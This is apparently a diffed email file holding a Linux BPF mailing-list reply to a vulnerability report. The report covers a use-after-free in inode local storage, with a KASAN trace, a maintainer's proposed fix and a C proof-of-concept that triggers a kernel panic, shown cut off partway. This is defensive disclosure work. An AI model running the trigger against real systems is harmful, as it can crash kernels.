-X-Gm-Features: AWmQ_bkNuSae5sjVgHN6rs_nb67RIheFWRdb7qzniiRDK0-OMmXC2YgVKDeZ3Cs
-Message-ID: <CAMB2axOySqp07ErmgaDysHPYJf5zvoNO12H2yxyu3dkOo9-tFA@mail.gmail.com>
-Subject: Re: bpf: Use-after-free in inode local storage due to premature
- i_security freeing
-To: =?UTF-8?B?5qKF5byA5b2m?= <kaiyanm@hust.edu.cn>
-Cc: daniel@iogearbox.net, bpf@vger.kernel.org, martin.lau@linux.dev, 
-	hust-os-kernel-patches@googlegroups.com, dddddd@hust.edu.cn, 
-	dzm91@hust.edu.cn
-Content-Type: text/plain; charset="UTF-8"
-Content-Transfer-Encoding: quoted-printable
+X-MS-Exchange-CrossTenant-AuthAs: Internal
+X-MS-Exchange-CrossTenant-AuthSource: IA3PR11MB8986.namprd11.prod.outlook.com
+X-MS-Exchange-CrossTenant-Network-Message-Id: deffbdd4-650a-408b-fdbf-08de30ab6309
+X-MS-Exchange-CrossTenant-originalarrivaltime: 01 Dec 2025 07:29:39.1882
+ (UTC)
+X-MS-Exchange-CrossTenant-fromentityheader: Hosted
+X-MS-Exchange-CrossTenant-id: 46c98d88-e344-4ed4-8496-4ed7712e255d
+X-MS-Exchange-CrossTenant-mailboxtype: HOSTED
+X-MS-Exchange-CrossTenant-userprincipalname: 1Gn+pYHcc0fv/21vo3dnRJiZGXAQlgPOfo13yprCvqaxTKHvN22/CV7eDIkV3LFYswSr6/6LNvLzfCvK3l9nyomKbDXDWPu7nCtrXkbE0o8=
+X-MS-Exchange-Transport-CrossTenantHeadersStamped: SJ0PR11MB4862
+X-OriginatorOrg: intel.com
 
-On Sun, Nov 30, 2025 at 9:51=E2=80=AFPM =E6=A2=85=E5=BC=80=E5=BD=A6 <kaiyan=
-m@hust.edu.cn> wrote:
->
-> Our fuzzer tool discovered a use-after-free vulnerability in the BPF subs=
-ystem related to inode local storage. The flaw is caused by incorrect objec=
-t lifetime management between the destruction of an inode's security blob (=
-`i_security`) and the cleanup of a BPF map that holds a reference to that i=
-node's storage.
->
-> Reported-by: Kaiyan Mei <M202472210@hust.edu.cn>
-> Reported-by: Yinhao Hu <dddddd@hust.edu.cn>
-> Reviewed-by: Dongliang Mu <dzm91@hust.edu.cn>
->
-> ## Root Cause
->
-> The use-after-free is caused by the premature freeing of an inode's secur=
-ity blob `i_security`. This happens because the BPF local storage subsystem=
- incorrectly manages the inode's object lifecycle, leading to a situation w=
-here the `i_security` memory is released while the BPF map still holds a da=
-ngling pointer to it. The sequence of events is as follows:
->
-> 1.  The `close()` syscall initiates the `__fput()` kernel function. The i=
-mplementation of `__fput` calls `dput()` before `file_free()`.
-> 2.  The call to `dput()` leads to `security_inode_free()`, which schedule=
-s the `inode->i_security` memory blob to be freed after an RCU grace period=
- by using `call_rcu()`. At this moment, the memory is not yet freed, but is=
- "pending free".
-> 3.  Later in the same `__fput()` execution, `file_free()` is called, trig=
-gering the attached BPF LSM program at the `security_file_free` hook.
-> 4.  The BPF program calls `bpf_inode_storage_get()`. Because the RCU grac=
-e period has not ended, the `inode->i_security` pointer is still valid. The=
- helper function successfully creates an association between the `inode` an=
-d a BPF local storage element.
-> 5.  Shortly after the `close()` call returns, the RCU grace period finish=
-es. The kernel executes the deferred free callback, and the `i_security` me=
-mory is actually freed. From this point on, the BPF map's element contains =
-a dangling reference.
-> 6.  Upon process termination, the BPF map's file descriptor is closed. Th=
-e kernel schedules a worker thread (`bpf_map_free_deferred`) to clean up th=
-e map. This cleanup code attempts to access the now-freed `i_security` blob=
- via the `bpf_inode()` function, resulting in a use-after-free.
->
->
-> ### Execution Flow Visualization
->
-> ```c
-> Vulnerability Execution Flow
-> |
-> |--- 1. `close(sock)` Syscall Execution
-> |    |
-> |    `-- __fput()
-> |        |
-> |        |--> dput() -> ... -> destroy_inode()
-> |        |    |
-> |        |    `-- security_inode_free(inode)
-> |        |        |
-> |        |        `-- call_rcu(inode->i_security, inode_free_by_rcu)
-> |        |            |
-> |        |            `-> State: inode->i_security is now "pending free".
-> |        |               The pointer is valid, but the memory is schedule=
-d for freeing.
-> |        |
-> |        `--> file_free()
-> |            |
-> |            `-- security_file_free()  // BPF program hook
-> |                |
-> |                `-- bpf_inode_storage_get()
-> |                    |
-> |                    `-> State: Successfully associates local_storage wit=
-h the inode because
-> |                        inode->i_security is still valid. A storage elem=
-ent now exists
-> |                        in the BPF map pointing to this inode.
-> |
-> |--- 2. RCU Grace Period Ends (shortly after `close()` returns)
-> |    |
-> |    `-- inode_free_by_rcu() is executed by a kernel callback
-> |        |
-> |        `-- kmem_cache_free(inode->i_security)
-> |            |
-> |            `-> State: inode->i_security memory is now freed.
-> |               The BPF map's storage element now contains a dangling poi=
-nter.
-> |
-> |--- 3. Process Exit & Map Cleanup
->      |
->      `-- bpf_map_free_deferred() -> ...
->          |
->          |-- bpf_selem_unlink_storage_nolock()
->          |   |
->          |   `-- inode_storage_ptr(inode)
->          |       |
->          |       `-- bpf_inode(inode)
->          |           |
->          |           `-- Accesses inode->i_security
->          |               |
->          |               `-> CRASH: Use-after-free occurs here.
->
-> ```
-
-Thanks for reporting. I've thought of this scenario when looking at
-the inode local storage code and this confirms it .
-
-cgroup and task already checks the refcount of the owner before
-actually creating a local storage (i.e., they skip if refcount =3D=3D 0),
-so we should probably do the same thing for inode like below (not
-tested):
-
-@@ -149,7 +149,8 @@ BPF_CALL_5(bpf_inode_storage_get, struct bpf_map
-*, map, struct inode *, inode,
-        /* This helper must only called from where the inode is guaranteed
-         * to have a refcount and cannot be freed.
-         */
--       if (flags & BPF_LOCAL_STORAGE_GET_F_CREATE) {
-+       if (icount_read(inode) &&
-+           flags & BPF_LOCAL_STORAGE_GET_F_CREATE) {
-                sdata =3D bpf_local_storage_update(
-                        inode, (struct bpf_local_storage_map *)map, value,
-                        BPF_NOEXIST, false, gfp_flags);
-
-I will test it and submit a patch tomorrow.
-
->
-> ## Reproduction Steps
->
-> 1.  **Map Creation**: Create a BPF map of type `BPF_MAP_TYPE_INODE_STORAG=
-E`.
-> 2.  **Program Setup**: Load a `BPF_PROG_TYPE_LSM` BPF program. The progra=
-m should be written to call the `bpf_inode_storage_get()` helper.
-> 3.  **Link Creation**: Attach the LSM program specifically to the `bpf_ls=
-m_file_free_security` hook via its BTF ID.
-> 4.  **Trigger**: Create and immediately close a socket. The sequence of k=
-ernel operations during the `close()` call will create the condition for th=
-e UAF. The UAF itself will be detected by KASAN when the process exits and =
-the map is garbage-collected.
->
->
-> ## KASAN Report
->
-> ```
-> [ 5498.067839][T10012] BUG: KASAN: slab-use-after-free in inode_storage_p=
-tr+0x93/0xa0
-> [ 5498.068151][T10012] Read of size 8 at addr ffff8881263bc5f8 by task kw=
-orker/u10:2/10012
-> [ 5498.068475][T10012]
-> [ 5498.068581][T10012] CPU: 1 UID: 0 PID: 10012 Comm: kworker/u10:2 Not t=
-ainted 6.18.0-rc7-next-20251128 #9 PREEMPT(full)
-> [ 5498.068588][T10012] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
-96), BIOS 1.15.0-1 04/01/2014
-> [ 5498.068592][T10012] Workqueue: events_unbound bpf_map_free_deferred
-> [ 5498.068605][T10012] Call Trace:
-> [ 5498.068610][T10012]  <TASK>
-> [ 5498.068614][T10012]  dump_stack_lvl+0x116/0x1b0
-> [ 5498.068628][T10012]  print_report+0xca/0x5f0
-> [ 5498.068640][T10012]  ? __phys_addr+0xf0/0x180
-> [ 5498.068650][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.068656][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.068663][T10012]  kasan_report+0xca/0x100
-> [ 5498.068686][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.068694][T10012]  inode_storage_ptr+0x93/0xa0
-> [ 5498.068701][T10012]  bpf_selem_unlink_storage_nolock+0x5ca/0x7c0
-> [ 5498.068709][T10012]  bpf_selem_unlink_storage+0x136/0x370
-> [ 5498.068716][T10012]  ? __pfx_bpf_selem_unlink_storage+0x10/0x10
-> [ 5498.068722][T10012]  ? lockdep_hardirqs_on+0x7c/0x110
-> [ 5498.068730][T10012]  ? _raw_spin_unlock_irqrestore+0x46/0x80
-> [ 5498.068738][T10012]  ? bpf_local_storage_map_free+0x1d3/0x630
-> [ 5498.068745][T10012]  bpf_local_storage_map_free+0x3d2/0x630
-> [ 5498.068759][T10012]  bpf_map_free_deferred+0x2e5/0x810
-> [ 5498.068767][T10012]  process_one_work+0x997/0x1b00
-> [ 5498.068778][T10012]  ? __pfx_process_one_work+0x10/0x10
-> [ 5498.068787][T10012]  ? assign_work+0x19b/0x250
-> [ 5498.068794][T10012]  worker_thread+0x683/0xe90
-> [ 5498.068803][T10012]  ? __pfx_worker_thread+0x10/0x10
-> [ 5498.068811][T10012]  kthread+0x3d5/0x780
-> [ 5498.068817][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.068824][T10012]  ? _raw_spin_unlock_irq+0x28/0x50
-> [ 5498.068830][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.068837][T10012]  ret_from_fork+0x96b/0xaf0
-> [ 5498.068844][T10012]  ? __pfx_ret_from_fork+0x10/0x10
-> [ 5498.068850][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.068856][T10012]  ? __switch_to+0x76c/0x10d0
-> [ 5498.068865][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.068872][T10012]  ret_from_fork_asm+0x1a/0x30
-> [ 5498.068884][T10012]  </TASK>
-> [ 5498.068886][T10012]
-> [ 5498.076497][T10012] Allocated by task 10052:
-> [ 5498.076678][T10012]  kasan_save_stack+0x24/0x50
-> [ 5498.076871][T10012]  kasan_save_track+0x14/0x30
-> [ 5498.077064][T10012]  __kasan_slab_alloc+0x87/0x90
-> [ 5498.077263][T10012]  kmem_cache_alloc_lru_noprof+0x294/0x840
-> [ 5498.077505][T10012]  sock_alloc_inode+0x2c/0x1e0
-> [ 5498.077702][T10012]  alloc_inode+0x6d/0x250
-> [ 5498.077881][T10012]  sock_alloc+0x45/0x280
-> [ 5498.078057][T10012]  __sock_create+0xc6/0x8e0
-> [ 5498.078241][T10012]  __sys_socket+0x14a/0x2e0
-> [ 5498.078425][T10012]  __x64_sys_socket+0x77/0xc0
-> [ 5498.078617][T10012]  do_syscall_64+0xcb/0xf80
-> [ 5498.078804][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-> [ 5498.079044][T10012]
-> [ 5498.079141][T10012] Freed by task 23:
-> [ 5498.079299][T10012]  kasan_save_stack+0x24/0x50
-> [ 5498.079494][T10012]  kasan_save_track+0x14/0x30
-> [ 5498.079686][T10012]  kasan_save_free_info+0x3b/0x60
-> [ 5498.079890][T10012]  __kasan_slab_free+0x61/0x80
-> [ 5498.080097][T10012]  kmem_cache_free+0x164/0x780
-> [ 5498.080293][T10012]  i_callback+0x4b/0x80
-> [ 5498.080465][T10012]  rcu_core+0x7a6/0x1510
-> [ 5498.080646][T10012]  handle_softirqs+0x1d9/0x840
-> [ 5498.080842][T10012]  run_ksoftirqd+0x3f/0x70
-> [ 5498.081027][T10012]  smpboot_thread_fn+0x3d9/0xab0
-> [ 5498.081228][T10012]  kthread+0x3d5/0x780
-> [ 5498.081396][T10012]  ret_from_fork+0x96b/0xaf0
-> [ 5498.081582][T10012]  ret_from_fork_asm+0x1a/0x30
-> [ 5498.081781][T10012]
-> [ 5498.081877][T10012] Last potentially related work creation:
-> [ 5498.082104][T10012]  kasan_save_stack+0x24/0x50
-> [ 5498.082297][T10012]  kasan_record_aux_stack+0xa7/0xc0
-> [ 5498.082510][T10012]  __call_rcu_common.constprop.0+0xa9/0xa10
-> [ 5498.082752][T10012]  destroy_inode+0x131/0x1b0
-> [ 5498.082940][T10012]  evict+0x579/0xa90
-> [ 5498.083100][T10012]  iput.part.0+0x7f9/0xf10
-> [ 5498.083281][T10012]  iput+0x3a/0x40
-> [ 5498.083432][T10012]  dentry_unlink_inode+0x29b/0x480
-> [ 5498.083626][T10012]  __dentry_kill+0x1d7/0x600
-> [ 5498.083814][T10012]  finish_dput+0x7a/0x460
-> [ 5498.083990][T10012]  dput.part.0+0x456/0x570
-> [ 5498.084172][T10012]  dput+0x24/0x30
-> [ 5498.084322][T10012]  __fput+0x51b/0xb50
-> [ 5498.084486][T10012]  fput_close_sync+0x114/0x210
-> [ 5498.084683][T10012]  __x64_sys_close+0x93/0x120
-> [ 5498.084876][T10012]  do_syscall_64+0xcb/0xf80
-> [ 5498.085065][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-> [ 5498.085304][T10012]
-> [ 5498.085401][T10012] The buggy address belongs to the object at ffff888=
-1263bc500
-> [ 5498.085401][T10012]  which belongs to the cache sock_inode_cache of si=
-ze 1344
-> [ 5498.085974][T10012] The buggy address is located 248 bytes inside of
-> [ 5498.085974][T10012]  freed 1344-byte region [ffff8881263bc500, ffff888=
-1263bca40)
-> [ 5498.086519][T10012]
-> [ 5498.086617][T10012] The buggy address belongs to the physical page:
-> [ 5498.086874][T10012] page: refcount:0 mapcount:0 mapping:00000000000000=
-00 index:0xffff8881263b8000 pfn:0x1263b8
-> [ 5498.087278][T10012] head: order:3 mapcount:0 entire_mapcount:0 nr_page=
-s_mapped:0 pincount:0
-> [ 5498.087616][T10012] memcg:ffff8881065e4301
-> [ 5498.087786][T10012] flags: 0x57ff00000000040(head|node=3D1|zone=3D2|la=
-stcpupid=3D0x7ff)
-> [ 5498.088094][T10012] page_type: f5(slab)
-> [ 5498.088259][T10012] raw: 057ff00000000040 ffff888100eaa000 dead0000000=
-00122 0000000000000000
-> [ 5498.088601][T10012] raw: ffff8881263b8000 0000000080160011 00000000f50=
-00000 ffff8881065e4301
-> [ 5498.088943][T10012] head: 057ff00000000040 ffff888100eaa000 dead000000=
-000122 0000000000000000
-> [ 5498.089288][T10012] head: ffff8881263b8000 0000000080160011 00000000f5=
-000000 ffff8881065e4301
-> [ 5498.089634][T10012] head: 057ff00000000003 ffffea000498ee01 00000000ff=
-ffffff 00000000ffffffff
-> [ 5498.089979][T10012] head: ffffffffffffffff 0000000000000000 00000000ff=
-ffffff 0000000000000008
-> [ 5498.090321][T10012] page dumped because: kasan: bad access detected
-> [ 5498.090580][T10012] page_owner tracks the page as allocated
-> [ 5498.090806][T10012] page last allocated via order 3, migratetype Recla=
-imable, gfp_mask 0xd20d0(__GFP_RECLAIMABLE|__GFP_IO|__GFP_FS|__GFP_NOWARN|_=
-_GFP_NORETR0
-> [ 5498.091672][T10012]  post_alloc_hook+0x1ca/0x240
-> [ 5498.091868][T10012]  get_page_from_freelist+0xdb8/0x2a70
-> [ 5498.092089][T10012]  __alloc_frozen_pages_noprof+0x25b/0x20f0
-> [ 5498.092328][T10012]  alloc_pages_mpol+0x1f6/0x550
-> [ 5498.092530][T10012]  new_slab+0x2d5/0x440
-> [ 5498.092700][T10012]  ___slab_alloc+0xde1/0x1bd0
-> [ 5498.092890][T10012]  __slab_alloc.constprop.0+0x6b/0x120
-> [ 5498.093113][T10012]  kmem_cache_alloc_lru_noprof+0x518/0x840
-> [ 5498.093348][T10012]  sock_alloc_inode+0x2c/0x1e0
-> [ 5498.093546][T10012]  alloc_inode+0x6d/0x250
-> [ 5498.093723][T10012]  sock_alloc+0x45/0x280
-> [ 5498.093899][T10012]  __sock_create+0xc6/0x8e0
-> [ 5498.094082][T10012]  __sys_socket+0x14a/0x2e0
-> [ 5498.094266][T10012]  __x64_sys_socket+0x77/0xc0
-> [ 5498.094457][T10012]  do_syscall_64+0xcb/0xf80
-> [ 5498.094645][T10012]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
-> [ 5498.094884][T10012] page_owner free stack trace missing
-> [ 5498.095098][T10012]
-> [ 5498.095195][T10012] Memory state around the buggy address:
-> [ 5498.095420][T10012]  ffff8881263bc480: fc fc fc fc fc fc fc fc fc fc f=
-c fc fc fc fc fc
-> [ 5498.095741][T10012]  ffff8881263bc500: fa fb fb fb fb fb fb fb fb fb f=
-b fb fb fb fb fb
-> [ 5498.096061][T10012] >ffff8881263bc580: fb fb fb fb fb fb fb fb fb fb f=
-b fb fb fb fb fb
-> [ 5498.096380][T10012]                                                   =
-              ^
-> [ 5498.096695][T10012]  ffff8881263bc600: fb fb fb fb fb fb fb fb fb fb f=
-b fb fb fb fb fb
-> [ 5498.097013][T10012]  ffff8881263bc680: fb fb fb fb fb fb fb fb fb fb f=
-b fb fb fb fb fb
-> [ 5498.097331][T10012] =3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=
-=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D=3D
-> [ 5498.097651][T10012] Kernel panic - not syncing: KASAN: panic_on_warn s=
-et ...
-> [ 5498.097940][T10012] CPU: 1 UID: 0 PID: 10012 Comm: kworker/u10:2 Not t=
-ainted 6.18.0-rc7-next-20251128 #9 PREEMPT(full)
-> [ 5498.098372][T10012] Hardware name: QEMU Standard PC (i440FX + PIIX, 19=
-96), BIOS 1.15.0-1 04/01/2014
-> [ 5498.098738][T10012] Workqueue: events_unbound bpf_map_free_deferred
-> [ 5498.099001][T10012] Call Trace:
-> [ 5498.099137][T10012]  <TASK>
-> [ 5498.099259][T10012]  dump_stack_lvl+0x3d/0x1b0
-> [ 5498.099453][T10012]  vpanic+0x67e/0x710
-> [ 5498.099621][T10012]  panic+0xc7/0xd0
-> [ 5498.099776][T10012]  ? __pfx_panic+0x10/0x10
-> [ 5498.099958][T10012]  ? end_report+0x4c/0x160
-> [ 5498.100142][T10012]  ? rcu_is_watching+0x12/0xc0
-> [ 5498.100337][T10012]  ? lock_release+0x1fc/0x2d0
-> [ 5498.100531][T10012]  ? check_panic_on_warn+0x24/0xc0
-> [ 5498.100740][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.100943][T10012]  check_panic_on_warn+0xb6/0xc0
-> [ 5498.101145][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.101347][T10012]  end_report+0x107/0x160
-> [ 5498.101529][T10012]  kasan_report+0xd8/0x100
-> [ 5498.101714][T10012]  ? inode_storage_ptr+0x93/0xa0
-> [ 5498.101920][T10012]  inode_storage_ptr+0x93/0xa0
-> [ 5498.102127][T10012]  bpf_selem_unlink_storage_nolock+0x5ca/0x7c0
-> [ 5498.102379][T10012]  bpf_selem_unlink_storage+0x136/0x370
-> [ 5498.102606][T10012]  ? __pfx_bpf_selem_unlink_storage+0x10/0x10
-> [ 5498.102852][T10012]  ? lockdep_hardirqs_on+0x7c/0x110
-> [ 5498.103064][T10012]  ? _raw_spin_unlock_irqrestore+0x46/0x80
-> [ 5498.103301][T10012]  ? bpf_local_storage_map_free+0x1d3/0x630
-> [ 5498.103542][T10012]  bpf_local_storage_map_free+0x3d2/0x630
-> [ 5498.103777][T10012]  bpf_map_free_deferred+0x2e5/0x810
-> [ 5498.103994][T10012]  process_one_work+0x997/0x1b00
-> [ 5498.104209][T10012]  ? __pfx_process_one_work+0x10/0x10
-> [ 5498.104431][T10012]  ? assign_work+0x19b/0x250
-> [ 5498.104622][T10012]  worker_thread+0x683/0xe90
-> [ 5498.104813][T10012]  ? __pfx_worker_thread+0x10/0x10
-> [ 5498.105024][T10012]  kthread+0x3d5/0x780
-> [ 5498.105193][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.105382][T10012]  ? _raw_spin_unlock_irq+0x28/0x50
-> [ 5498.105595][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.105784][T10012]  ret_from_fork+0x96b/0xaf0
-> [ 5498.105975][T10012]  ? __pfx_ret_from_fork+0x10/0x10
-> [ 5498.106184][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.106373][T10012]  ? __switch_to+0x76c/0x10d0
-> [ 5498.106569][T10012]  ? __pfx_kthread+0x10/0x10
-> [ 5498.106760][T10012]  ret_from_fork_asm+0x1a/0x30
-> [ 5498.106961][T10012]  </TASK>
-> [ 5498.107386][T10012] Kernel Offset: disabled
-> ```
->
-> ## Proof of Concept
->
-> The following C program can demonstrate the vulnerability on linux-next-2=
-0251128(commit 7d31f578f3230f3b7b33b0930b08f9afd8429817).
->
-> To successfully run the PoC, you need to obtain the BTF ID for `bpf_lsm_f=
-ile_free_security` and set the variable `btf_id` in function `load_prog` to=
- this value. You can retrieve this BTF ID using the following command: `bpf=
-tool btf dump file path-to-your-vmlinux | grep bpf_lsm_file_free_security`.
->
-> ```c
-> #define _GNU_SOURCE
->
-> #include <dirent.h>
-> #include <endian.h>
-> #include <errno.h>
-> #include <fcntl.h>
-> #include <signal.h>
-> #include <stdarg.h>
-> #include <stdbool.h>
-> #include <stdint.h>
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <string.h>
-> #include <sys/prctl.h>
-> #include <sys/stat.h>
-> #include <sys/syscall.h>
-> #include <sys/types.h>
-> #include <sys/wait.h>
-> #include <sys/ioctl.h>
-> #include <time.h>
-> #include <unistd.h>
-> #include <linux/bpf.h>
-> #include <sys/socket.h>
->
-> #ifndef __NR_bpf
-> #define __NR_bpf 321
-> #endif
->
-> #define BPF_FUNC_inode_storage_get 145
-> #define BPF_FUNC_inode_storage_delete 146
->
-> #define BPF_EXIT_INSN()                                         \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_JMP | BPF_EXIT,                    \
->                 .dst_reg =3D 0,                                   \
->                 .src_reg =3D 0,                                   \
->                 .off   =3D 0,                                     \
->                 .imm   =3D 0 })
->
-> #define BPF_MOV64_IMM(DST, IMM)                                 \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_K,           \
->                 .dst_reg =3D DST,                                 \
->                 .src_reg =3D 0,                                   \
->                 .off   =3D 0,                                     \
->                 .imm   =3D IMM })
->
-> #define BPF_LDX_MEM(SIZE, DST, SRC, OFF)                        \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_LDX | BPF_SIZE(SIZE) | BPF_MEM,    \
->                 .dst_reg =3D DST,                                 \
->                 .src_reg =3D SRC,                                 \
->                 .off   =3D OFF,                                   \
->                 .imm   =3D 0 })
->
-> #define BPF_LD_IMM64_RAW_FULL(DST, SRC, OFF1, OFF2, IMM1, IMM2) \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_LD | BPF_DW | BPF_IMM,             \
->                 .dst_reg =3D DST,                                 \
->                 .src_reg =3D SRC,                                 \
->                 .off   =3D OFF1,                                  \
->                 .imm   =3D IMM1 }),                               \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D 0, /* zero is reserved opcode */       \
->                 .dst_reg =3D 0,                                   \
->                 .src_reg =3D 0,                                   \
->                 .off   =3D OFF2,                                  \
->                 .imm   =3D IMM2 })
->
-> /* pseudo BPF_LD_IMM64 insn used to refer to process-local map_fd */
->
-> #define BPF_LD_MAP_FD(DST, MAP_FD)                              \
->         BPF_LD_IMM64_RAW_FULL(DST, BPF_PSEUDO_MAP_FD, 0, 0,     \
->                               MAP_FD, 0)
->
-> #define BPF_MOV64_REG(DST, SRC)                                 \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_ALU64 | BPF_MOV | BPF_X,           \
->                 .dst_reg =3D DST,                                 \
->                 .src_reg =3D SRC,                                 \
->                 .off   =3D 0,                                     \
->                 .imm   =3D 0 })
->
-> #define BPF_EMIT_CALL(FUNC)                                     \
->         ((struct bpf_insn) {                                    \
->                 .code  =3D BPF_JMP | BPF_CALL,                    \
->                 .dst_reg =3D 0,                                   \
->                 .src_reg =3D 0,                                   \
->                 .off   =3D 0,                                     \
->                 .imm   =3D ((FUNC) - BPF_FUNC_unspec) })
->
->
-> static unsigned long long procid;
-> static inline uint64_t ptr_to_u64(const void *ptr) {
->     return (uint64_t)(unsigned long)ptr;
-> }
->
->
-> int create_btf_fd(){
->     *(uint64_t*)0x200000000100 =3D 0x200000000000;
->     *(uint16_t*)0x200000000000 =3D 0xeb9f;
->     *(uint8_t*)0x200000000002 =3D 1;
->     *(uint8_t*)0x200000000003 =3D 0;
->     *(uint32_t*)0x200000000004 =3D 0x18;
->     *(uint32_t*)0x200000000008 =3D 0;
->     *(uint32_t*)0x20000000000c =3D 0x1c;
->     *(uint32_t*)0x200000000010 =3D 0x1c;
->     *(uint32_t*)0x200000000014 =3D 2;
->     *(uint32_t*)0x200000000018 =3D 0;
->     *(uint16_t*)0x20000000001c =3D 0;
->     *(uint8_t*)0x20000000001e =3D 0;
->     *(uint8_t*)0x20000000001f =3D 1;
->     *(uint32_t*)0x200000000020 =3D 4;
->     *(uint8_t*)0x200000000024 =3D 0x20;
->     *(uint8_t*)0x200000000025 =3D 0;
->     *(uint8_t*)0x200000000026 =3D 0;
->     *(uint8_t*)0x200000000027 =3D 1;
->     *(uint32_t*)0x200000000028 =3D 1;
->     *(uint16_t*)0x20000000002c =3D 0;
->     *(uint8_t*)0x20000000002e =3D 0;
->     *(uint8_t*)0x20000000002f =3D 0x10;
->     *(uint32_t*)0x200000000030 =3D 8;
->     *(uint8_t*)0x200000000034 =3D 0;
->     *(uint8_t*)0x200000000035 =3D 0;
->     *(uint64_t*)0x200000000108 =3D 0;
->     *(uint32_t*)0x200000000110 =3D 0x36;
->     *(uint32_t*)0x200000000114 =3D 0;
->     *(uint32_t*)0x200000000118 =3D 1;
->     *(uint32_t*)0x20000000011c =3D 0;
->     *(uint32_t*)0x200000000120 =3D 0;
->     *(uint32_t*)0x200000000124 =3D 0;
->     int res =3D syscall(__NR_bpf, /*cmd=3D*/0x12ul, /*arg=3D*/0x200000000=
-100ul, /*size=3D*/0x28ul);
->     return res;
-> }
->
-> int bpf_map_create(uint32_t map_type, uint32_t key_size, uint32_t value_s=
-ize, unsigned int max_entries, unsigned int flags, unsigned int btf_id) {
->         union bpf_attr attr =3D {.map_type =3D map_type,
->         .key_size =3D key_size,
->         .value_size =3D value_size,
->         .max_entries =3D max_entries,
->         .map_flags =3D flags,
->         .map_extra =3D 0,
->         .btf_fd=3Dbtf_id,
->         .btf_key_type_id=3D1,
->         .btf_value_type_id=3D1,
->     };
->         return syscall(__NR_bpf, 0, &attr, 0x40);
-> }
->
-> static int load_prog(struct bpf_insn *insns, size_t cnt) {
->     int btf_id =3D 0; // change to valid btf of bpf_lsm_file_free_securit=
-y
->     if(btf_id =3D=3D 0) {
->         printf("Btf id is not available! \n");
->         exit(0);
->     }
->
->     union bpf_attr attr =3D {
->         .prog_type =3D 0x1d,
->         .insns =3D ptr_to_u64(insns),
->         .insn_cnt =3D cnt,
->         .license =3D ptr_to_u64("GPL"),
->         .attach_btf_id =3D btf_id,
->         .expected_attach_type =3D BPF_LSM_MAC,
->         .log_level =3D 3,
->     };
->     int prog_fd=3Dsyscall(__NR_bpf, 5, &attr, sizeof(attr));
->     return prog_fd;
-> }
->
-> int link_create(int prog_fd, int target_fd, uint32_t attach_type)
-> {
->         union bpf_attr attr =3D {
->                 .link_create.prog_fd =3D prog_fd,
->                 .link_create.target_fd =3D target_fd,
->                 .link_create.attach_type =3D attach_type,
->         };
->
->         return syscall(__NR_bpf, BPF_LINK_CREATE, &attr, sizeof(attr.link=
-_create));
-> }
->
-> uint64_t r[4] =3D {0xffffffffffffffff, 0xffffffffffffffff, 0xffffffffffff=
-ffff, 0xffffffffffffffff};
->
-> void execute_one(void)
-> {
->         intptr_t res =3D 0;
->         if (write(1, "executing program\n", sizeof("executing program\n")=
- - 1)) {}
->
->         res =3D create_btf_fd();
->         if (res !=3D -1)
->                 r[0] =3D res;
->
->         res =3D bpf_map_create(0x1c, 4, 4, 0, 0x201, r[0]);
->         if (res !=3D -1)
->                 r[1] =3D res;
->         struct bpf_insn prog[] =3D {
->             BPF_LDX_MEM(BPF_DW, BPF_REG_1, BPF_REG_1, 0),
->             BPF_LDX_MEM(BPF_DW, BPF_REG_6, BPF_REG_1, 96),
->             BPF_LD_MAP_FD(BPF_REG_1, r[1]),
->             BPF_MOV64_REG(BPF_REG_2, BPF_REG_6),
->             BPF_MOV64_IMM(BPF_REG_3, 0x0),
->             BPF_MOV64_IMM(BPF_REG_4, 0x1),
->             BPF_EMIT_CALL(BPF_FUNC_inode_storage_get),
->             BPF_MOV64_IMM(BPF_REG_0, 0x0),
->             BPF_EXIT_INSN()
->         };
->         res =3D load_prog(prog, sizeof(prog) / sizeof(prog[0]));
->         printf("loaded prog %ld\n", res);
->         if (res !=3D -1)
->             r[3] =3D res;
->         int link =3D link_create(r[3], 0, BPF_LSM_MAC);
->         int sock =3D socket(AF_INET, SOCK_STREAM, 0);
->         printf("created link %d and socket %d\n", link, sock);
->         close(sock);
->         printf("sock release done\n");
-> }
-> int main(void)
-> {
->         syscall(__NR_mmap, /*addr=3D*/0x1ffffffff000ul, /*len=3D*/0x1000u=
-l, /*prot=3D*/0ul, /*flags=3DMAP_FIXED|MAP_ANONYMOUS|MAP_PRIVATE*/0x32ul, /=
-*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
->         syscall(__NR_mmap, /*addr=3D*/0x200000000000ul, /*len=3D*/0x10000=
-00ul, /*prot=3DPROT_WRITE|PROT_READ|PROT_EXEC*/7ul, /*flags=3DMAP_FIXED|MAP=
-_ANONYMOUS|MAP_PRIVATE*/0x32ul, /*fd=3D*/(intptr_t)-1, /*offset=3D*/0ul);
->         syscall(__NR_mmap, /*addr=3D*/0x200001000000ul, /*len=3D*/0x1000u=
